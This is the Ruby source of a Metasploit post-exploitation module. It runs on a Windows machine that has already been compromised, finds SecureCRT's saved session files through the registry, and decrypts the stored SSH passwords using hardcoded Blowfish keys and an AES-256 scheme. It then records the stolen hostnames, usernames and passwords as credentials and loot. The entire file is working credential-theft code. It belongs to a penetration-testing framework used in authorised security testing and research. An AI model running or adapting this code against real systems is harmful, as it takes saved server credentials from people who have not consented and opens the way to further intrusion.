##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Windows::Registry

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Windows SecureCRT Session Information Enumeration',
        'Description' => %q{
          This module will determine if SecureCRT is installed on the target system and, if it is, it will try to
          dump all saved session information from the target. The passwords for these saved sessions will then be decrypted
          where possible, using the decryption information that HyperSine reverse engineered.

          Note that whilst SecureCRT has installers for Linux, Mac and Windows, this module presently only works on Windows.
        },
        'License' => MSF_LICENSE,
        'References' => [
          [ 'URL', 'https://github.com/HyperSine/how-does-SecureCRT-encrypt-password/blob/master/doc/how-does-SecureCRT-encrypt-password.md']
        ],
        'Author' => [
          'HyperSine', # Original author of the SecureCRT session decryption script and one who found the encryption keys.
          'Kali-Team <kali-team[at]qq.com>' # Metasploit module
        ],
        'Platform' => [ 'win' ],
        'SessionTypes' => [ 'meterpreter' ]
      )
    )
    register_options(
      [
        OptString.new('PASSPHRASE', [ false, 'The configuration password that was set when SecureCRT was installed, if one was supplied']),
      ]
    )
  end

  def blowfish_decrypt(secret_key, text)
    cipher = OpenSSL::Cipher.new('bf-cbc').decrypt
    cipher.padding = 0
    cipher.key_len = secret_key.length
    cipher.key = secret_key
    cipher.iv = "\x00" * 8
    cipher.update(text) + cipher.final
  end

  def try_encode_file(data)
    if data[0].unpack('C') == [255] && data[1].unpack('C') == [254]
      data[2..-1].force_encoding('UTF-16LE').encode('UTF-8')
    elsif data[0].unpack('C') == [254] && data[1].unpack('C') == [187] && data[2].unpack('C') == [191]
      data
    elsif data[0].unpack('C') == [254] && data[1].unpack('C') == [255]
      data[2..-1].force_encoding('UTF-16BE').encode('UTF-8')
    else
      data
    end
  end

  def enum_session_file(path)
    config_ini = []
    tbl = []
    print_status("Searching for session files in #{path}")
    config_ini += session.fs.file.search(path, '*.ini')

    # enum session file
    config_ini.each do |item|
      file_name = item['path'] + session.fs.file.separator + item['name']
      file_contents = read_file(file_name) if !['__FolderData__.ini', 'Default.ini'].include?(item['name'])
      if file_contents.nil? || file_contents.empty?
        next
      end

      file = try_encode_file(file_contents)
      hostname = Regexp.compile('S:"Hostname"=([^\r\n]*)').match(file) ? Regexp.last_match(1) : nil
      password = Regexp.compile('S:"Password"=u([0-9a-f]+)').match(file) ? securecrt_crypto(Regexp.last_match(1)) : nil
      passwordv2 = Regexp.compile('S:"Password V2"=02:([0-9a-f]+)').match(file) ? securecrt_crypto_v2(Regexp.last_match(1)) : nil
      port = Regexp.compile('D:"\[SSH2\] Port"=([0-9a-f]{8})').match(file) ? Regexp.last_match(1).to_i(16).to_s : nil
      username = Regexp.compile('S:"Username"=([^\r\n]*)').match(file) ? Regexp.last_match(1) : nil
      tbl << {
        file_name: item['name'],
        hostname: hostname,
        port: port,
        username: username,
        password: password || passwordv2
      }
    end
    return tbl
  end

  def securecrt_crypto(ciphertext)
    key1 = "\x24\xA6\x3D\xDE\x5B\xD3\xB3\x82\x9C\x7E\x06\xF4\x08\x16\xAA\x07"
    key2 = "\x5F\xB0\x45\xA2\x94\x17\xD9\x16\xC6\xC6\xA2\xFF\x06\x41\x82\xB7"
    ciphered_bytes = [ciphertext].pack('H*')
    cipher_tmp = blowfish_decrypt(key1, ciphered_bytes)[4..-5]
    padded_plain_bytes = blowfish_decrypt(key2, cipher_tmp)
    (0..padded_plain_bytes.length).step(2) do |i|
      if (padded_plain_bytes[i] == "\x00" && padded_plain_bytes[i + 1] == "\x00")
        return padded_plain_bytes[0..i - 1].force_encoding('UTF-16LE').encode('UTF-8')
      end
    end
    print_warning('It was not possible to decode one of the v1 passwords successfully, please double check the results!')
    return nil # We didn't decode the password successfully, so just return nil.
  end

  def securecrt_crypto_v2(ciphertext)
    iv = ("\x00" * 16)
    config_passphrase = datastore['PASSPHRASE'] || nil
    key = OpenSSL::Digest::SHA256.new(config_passphrase).digest
    aes = OpenSSL::Cipher.new('AES-256-CBC')
    aes.key = key
    aes.padding = 0
    aes.decrypt
    aes.iv = iv
    padded_plain_bytes = aes.update([ciphertext].pack('H*'))
    plain_bytes_length = padded_plain_bytes[0, 4].unpack1('l') # bytes to int little-endian format.
    plain_bytes = padded_plain_bytes[4, plain_bytes_length]
    plain_bytes_digest = padded_plain_bytes[4 + plain_bytes_length, 32]
    if (OpenSSL::Digest::SHA256.new(plain_bytes).digest == plain_bytes_digest) # verify
      return plain_bytes.force_encoding('UTF-8')
    end

    print_warning('It seems the user set a configuration password when installing SecureCRT!')
    print_warning('If you know the configuration password, please provide it via the PASSPHRASE option and then run the module again.')
    return nil
  end

  def securecrt_store_config(config)
    service_data = {
      address: config[:hostname],
      port: config[:port],
      service_name: 'ssh',
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :session,
      session_id: session_db_id,
      post_reference_name: refname,
      private_type: :password,
      private_data: config[:password],
      username: config[:username]
    }.merge(service_data)

    credential_core = create_credential(credential_data)

    login_data = {
      core: credential_core,
      status: Metasploit::Model::Login::Status::UNTRIED
    }.merge(service_data)

    create_credential_login(login_data)
  end

  def run
    print_status("Gathering SecureCRT session information from #{sysinfo['Computer']}")
    parent_key = 'HKEY_CURRENT_USER\\Software\\VanDyke\\SecureCRT'
    # get session file path
    securecrt_path = expand_path(registry_getvaldata(parent_key, 'Config Path') + session.fs.file.separator + 'Sessions')
    unless securecrt_path.to_s.empty?
      result = enum_session_file(securecrt_path)
      columns = [
        'Filename',
        'Hostname',
        'Port',
        'Username',
        'Password',
      ]
      tbl = Rex::Text::Table.new(
        'Header' => 'SecureCRT Sessions',
        'Columns' => columns
      )
      result.each do |item|
        tbl << item.values
        config = {
          file_name: item[:file_name],
          hostname: item[:hostname],
          port: item[:port].to_i,
          username: item[:username],
          password: item[:password]
        }
        securecrt_store_config(config)
      end
      print_line(tbl.to_s)
      if tbl.rows.count
        path = store_loot('host.securecrt_sessions', 'text/plain', session, tbl, 'securecrt_sessions.txt', 'SecureCRT Sessions')
        print_good("Session info stored in: #{path}")
      end
    else
      print_error('Could not find the registry entry for the SecureCRT session path. Ensure that SecureCRT is installed on the target.')
    end
  end
end
